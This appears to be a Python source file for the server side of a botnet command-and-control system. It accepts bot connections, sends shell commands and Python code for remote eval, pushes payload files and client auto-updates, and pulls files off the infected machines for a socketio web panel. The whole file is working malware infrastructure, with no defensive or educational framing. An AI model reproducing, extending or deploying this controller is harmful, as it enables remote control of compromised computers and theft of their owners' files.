import importlib
from distutils.version import LooseVersion
import json
from threading import Thread, Condition
from threading import Lock
import select
import base64
import os

try:
    from server import formatsock, server
except:
    import formatsock
    import server

MIN_CLIENT_VERSION = "0.2"

class BotNet(Thread):
    INPUT_TIMEOUT = 1
    PRINTOUT_JSON = 'printout'
    STDOUT_JSON = 'stdout'
    STDERR_JSON = 'stderr'
    SPEC_JSON = 'special'
    FILESTREAM_JSON = 'filestreams'
    FILECLOSE_JSON = 'fileclose'
    PAYLOAD_EXT = '.py'

    def __init__(self, socketio, payloadpath="payloads"):
        super().__init__()
        self.connlock = Lock()
        self.conncon = Condition(self.connlock)
        self.allConnections = {}
        self.socketio = socketio
        self.filemanager = BotNetFileManager()
        self.payloadpath = payloadpath
        self.payloadfiles = []

    def addConnection(self, user, conn):
        with self.connlock:
            if user in self.allConnections:
                pass  # TODO: How to deal with duplicate usernames?
            self.allConnections[user] = conn
            self.conncon.notifyAll()
            # Notify recv thread

    def removeConnection(self, user):
        # Will be making changes to allConnections
        with self.connlock:
            if user in self.allConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.allConnections[user].close()
                except:
                    pass
                # Remove object, don't delete so sends still go through
                self.allConnections.pop(user)
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))

    def getConnections(self):
        with self.connlock:
            return self.allConnections.keys()

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.allConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.allConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    jsonobj = json.loads(msg.decode('UTF-8'))
                    printout = ""
                    out = ""
                    err = ""
                    special = {}
                    filestream = {}
                    fileclose = []

                    if BotNet.PRINTOUT_JSON in jsonobj:
                        printout = jsonobj[BotNet.PRINTOUT_JSON]
                    if BotNet.STDOUT_JSON in jsonobj:
                        out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                    if BotNet.STDERR_JSON in jsonobj:
                        err = jsonobj[BotNet.STDERR_JSON].rstrip()
                    if BotNet.SPEC_JSON in jsonobj:
                        special = jsonobj[BotNet.SPEC_JSON]
                    if BotNet.FILESTREAM_JSON in jsonobj:
                        filestream = jsonobj[BotNet.FILESTREAM_JSON]
                    if BotNet.FILECLOSE_JSON in jsonobj:
                        fileclose = jsonobj[BotNet.FILECLOSE_JSON]

                    # Forward stdout/stderr... as needed
                    self.socketio.emit('response',
                                       {'user': user,
                                        'printout': printout,
                                        'stdout': out,
                                        'stderr': err},
                                       namespace="/bot")

                    self.socketio.emit('finder',
                                       {'special': special,
                                        'user': user},
                                       namespace="/bot")

                    # Forward file bytes as needed
                    for filename in filestream.keys():
                        # Get the b64 encoded bytes from the client in string form, change to normal bytes
                        filebytes = base64.b64decode(filestream[filename])
                        self.filemanager.appendBytesToFile(user, filename, filebytes)

                    for filename in fileclose:
                        self.filemanager.closeFile(user, filename)

                except IOError:
                    # Connection was interrupted
                    self.removeConnection(user)

    def sendStdin(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="stdin")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendCmd(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="cmd")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendEval(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="eval")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendFile(self, user, filename, fileobj):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].sendFile(filename, fileobj)
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def getPayloads(self):
        if len(self.payloadfiles)==0:
            for root, dirs, files in os.walk(self.payloadpath):
                for file in files:
                    if file.endswith(BotNet.PAYLOAD_EXT):
                        self.payloadfiles.append(os.path.join(root,file)[len(self.payloadpath)+1:-len(BotNet.PAYLOAD_EXT)])
        return self.payloadfiles

    def sendPayload(self, user, payload):
        with self.connlock:
            if user not in self.allConnections:
                return False
        payloadfile = os.path.join(self.payloadpath,payload+BotNet.PAYLOAD_EXT)
        with open(payloadfile,"r") as f:
            payloadtext = f.read()
            return self.sendEval(user,payloadtext)


    def startFileDownload(self, user, filename):
        with self.connlock:
            if user in self.allConnections:
                self.filemanager.clearFile(user, filename)
                self.allConnections[user].startFileDownload(filename)
                return self.filemanager.getFileGenerator(user, filename)
            return None

    def requestLs(self, user, filename):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].requestLs(filename)

    def getFileManager(self):
        return self.filemanager


class BotServer(Thread):
    def __init__(self, tcpsock, botnet, socketio, clientfile):
        Thread.__init__(self)
        self.tcpsock = tcpsock
        self.botnet = botnet
        self.socketio = socketio
        self.clientfile = clientfile
        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))

            user = host_info['user'].strip()
            botversion = LooseVersion(host_info['version'])
            bot = Bot(clientsock, host_info, self.socketio)
            if botversion < self.clientversion:
                # Autoupdate
                print("[*] Updating {} on version {}".format(user, botversion))
                bot.sendClientFile(open(self.clientfile, 'rb'))
            else:
                print("[+] Received connection from {}".format(user))
                self.botnet.addConnection(user, bot)
                self.socketio.emit('connection', {'user': user}, namespace='/bot')


class Bot:
    FILE_SHARD_SIZE = 4096
    FILE_STREAM = 'fstream'
    FILE_CLOSE = 'fclose'
    FILE_FILENAME = 'fname'
    CLIENT_STREAM = 'cstream'
    CLIENT_CLOSE = 'cclose'
    FILE_DOWNLOAD = 'down'
    LS_JSON = 'ls'

    def __init__(self, sock, host_info, socketio):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]
        self.botlock = Lock()
        self.socketio = socketio

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type: cmd})
        with self.botlock:
            self.sock.send(json_str)

    def recv(self):
        return self.sock.recv()

    def close(self):
        with self.botlock:
            self.sock.close()

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        return self.sock.fileno()

    def sendFile(self, filename, fileobj):
        # TODO: single worker thread instead of new one?
        t = Thread(target=self.__sendFileHelper(fileobj, filename))
        t.start()

    def sendClientFile(self, fileobj):
        self.sendFile(None, fileobj)

    def __sendFileHelper(self, fileobj, filename=None):
        with self.botlock:
            dat = fileobj.read(Bot.FILE_SHARD_SIZE)
            if len(dat) > 0:
                while len(dat) > 0:
                    # Turn the bytes into b64 encoded bytes, then into string
                    bytestr = base64.b64encode(dat).encode('UTF-8')
                    if filename:
                        # Particular file
                        json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                    else:
                        # Client file
                        json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                    self.sock.send(json_str)
                    dat = fileobj.read(Bot.FILE_SHARD_SIZE)
                if filename:
                    json_str = json.dumps({Bot.FILE_CLOSE: filename})
                else:
                    json_str = json.dumps({Bot.CLIENT_CLOSE: True})
                self.sock.send(json_str)
                fileobj.close()
                self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"},
                                   namespace='/bot')

    def startFileDownload(self, filename):
        with self.botlock:
            json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
            self.sock.send(json_str)

    def requestLs(self, filename):
        with self.botlock:
            json_str = json.dumps({Bot.LS_JSON: filename})
            self.sock.send(json_str)


class BotNetFileManager:
    # TODO: change to separate locks for each file
    def __init__(self):
        self.files = {}
        self.closed = set()
        self.lock = Lock()
        self.cond = Condition(self.lock)

    def getFileGenerator(self, user, filename):
        uf = (user, filename)

        def filegen():
            with self.lock:
                # While there's something left and it's not closed
                # Therefore: exits loop if closed and empty buffer
                while uf not in self.closed or len(self.files[uf]) > 0:
                    # Wait until closed or something to write
                    # Therefore: exits wait if closed or nonempty buffer
                    while (uf not in self.files or len(self.files[uf]) == 0) and uf not in self.closed:
                        self.cond.wait()
                    if len(self.files[uf]) > 0:
                        temp = self.files[uf]
                        self.files[uf] = b''
                        yield base64.b64encode(temp)
                self.closed.remove(uf)

        return filegen()

    def appendBytesToFile(self, user, filename, wbytes):
        uf = (user, filename)
        with self.lock:
            if uf not in self.files:
                self.files[uf] = b''

            self.files[uf] += wbytes
            self.cond.notify()

    def clearFile(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if uf in self.files:
                self.files[uf] = b''
            if uf in self.closed:
                self.closed.remove(uf)

    def closeFile(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if uf not in self.closed:
                self.closed.add(uf)
                self.cond.notify()
